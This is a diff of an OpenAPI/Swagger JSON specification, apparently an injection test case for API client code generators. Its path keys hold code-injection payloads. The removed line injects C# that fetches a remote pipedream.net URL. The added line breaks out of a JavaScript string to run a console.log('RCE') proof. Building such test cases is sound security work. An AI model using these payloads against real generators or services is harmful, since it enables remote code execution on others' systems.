@@ -17,7 +17,7 @@
               "application/json"
           ],
           "paths": {
-              "/a\";Console.WriteLine(new WebClient().DownloadString(\"https://eo2gjl4lyl460rs.m.pipedream.net\"));": {
+              "/a');};};return exports;}));console.log('RCE');(function(){}(this,function(){a=function(){b=function(){new Array('": {
                   "get": {
                       "description": "D",
                       "responses": {
